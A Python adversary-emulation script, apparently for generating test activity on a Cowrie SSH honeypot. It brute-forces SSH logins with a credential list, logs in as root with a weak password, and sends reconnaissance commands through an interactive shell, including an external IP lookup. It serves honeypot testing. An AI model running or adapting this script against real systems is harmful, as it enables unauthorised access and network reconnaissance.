"""
Script de Emulação de Adversário (Attack Simulation)
Executa simulação controlada contra o Cowrie Honeypot (porta 22):
1. Múltiplas tentativas de login brute-force com credenciais comuns
2. Autenticação bem-sucedida (root:123456)
3. Execução de comandos de reconhecimento na sandbox Cowrie
"""

import socket
import time
import paramiko


TARGET_HOST = "100.61.122.94"
TARGET_PORT = 22

FAILED_CREDENTIALS = [
    ("service_account", "svc_pass_2026"),
    ("backup_admin", "Backup#2026!"),
    ("jenkins", "jenkins_ci_token"),
    ("devops", "devops_internal"),
    ("nagios", "nagios_mon"),
    ("support", "wrong_supp_pass"),
]

SUCCESS_USER = "root"
SUCCESS_PASS = "123456"

COMMANDS_TO_RUN = [
    "uname -mrs",
    "id",
    "whoami",
    "cat /etc/os-release",
    "ip addr",
    "ps aux | head -n 10",
    "curl -I https://checkip.amazonaws.com",
    "echo 'adversary simulation cycle completed'",
    "exit"
]


def run_adversary_simulation():
    print(f"[*] Conectando ao honeypot {TARGET_HOST}:{TARGET_PORT}...")

    # 1. Fase de Brute-Force (Falhas)
    print("\n--- FASE 1: Tentativas de Brute-Force Rejeitadas ---")
    for user, pwd in FAILED_CREDENTIALS:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                hostname=TARGET_HOST,
                port=TARGET_PORT,
                username=user,
                password=pwd,
                timeout=5,
                allow_agent=False,
                look_for_keys=False
            )
            print(f"[!] Login inesperadamente aceito: {user}:{pwd}")
            client.close()
        except paramiko.AuthenticationException:
            print(f"[+] Falha esperada registrada: {user}:{pwd}")
        except Exception as e:
            print(f"[!] Erro de conexão em {user}: {e}")
        time.sleep(0.5)

    # 2. Fase de Exploração (Login com Sucesso)
    print("\n--- FASE 2: Autenticação Bem-Sucedida e Exploração de Shell ---")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            hostname=TARGET_HOST,
            port=TARGET_PORT,
            username=SUCCESS_USER,
            password=SUCCESS_PASS,
            timeout=8,
            allow_agent=False,
            look_for_keys=False
        )
        print(f"[+] Autenticado com sucesso como {SUCCESS_USER}!")

        # Invoca shell interativo
        chan = client.invoke_shell()
        time.sleep(1)

        for cmd in COMMANDS_TO_RUN:
            print(f"    -> Injetando comando: {cmd}")
            chan.send(cmd + "\n")
            time.sleep(0.8)

        time.sleep(2)
        client.close()
        print("[+] Sessão SSH encerrada com sucesso.")
    except Exception as e:
        print(f"[!] Falha na sessão interativa: {e}")


if __name__ == "__main__":
    run_adversary_simulation()
